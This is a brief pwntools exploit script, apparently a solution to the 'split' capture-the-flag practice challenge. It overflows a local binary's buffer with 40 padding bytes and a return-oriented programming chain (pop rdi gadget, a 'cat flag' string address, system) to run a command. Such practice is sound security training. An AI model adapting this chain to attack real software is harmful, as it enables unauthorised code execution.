import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

io = process("./split")

padding = b"\x90" * 40

cat_flag    = p64(0x601060)
pop_rdi     = p64(0x400883)
system_addr = p64(0x400810)

payload = b""
payload += padding
payload += pop_rdi
payload += cat_flag
payload += system_addr

io.recvuntil("> ")
io.send(payload)
io.send("\n")
shared_pwn._recvall(io)